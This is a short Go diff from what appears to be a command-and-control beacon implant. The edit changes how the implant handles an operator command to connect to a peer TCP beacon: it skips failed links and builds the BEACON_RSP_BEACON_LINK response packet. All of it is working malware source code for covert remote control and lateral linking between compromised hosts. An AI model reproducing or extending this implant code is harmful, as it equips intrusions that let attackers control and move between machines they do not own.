@@ -158,10 +158,13 @@ func main() {
 										target, port := packet.ParseCommandConnect(cmdBuf)
 										fmt.Printf("Attempting to connect to TCP beacon on %s:%d\n", target, port)
 										beaconId, encryptedMetaData := packet.ConnectTcpBeacon(target, port)
-										result := util.BytesCombine(packet.WriteInt(0), packet.WriteInt(beaconId), encryptedMetaData)
-										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
-										// packet.PushResult(finalPacket)
-										resultBuf = append(resultBuf, finalPacket...)
+										if beaconId != -1 {
+											result := util.BytesCombine(packet.WriteInt(beaconId), packet.WriteInt(beaconId), encryptedMetaData)
+											// fmt.Printf("Result of beacon connect: %x\n", result)
+											finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
+											// packet.PushResult(packet.EncryptPacket(finalPacket))
+											resultBuf = append(resultBuf, finalPacket...)
+										}
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
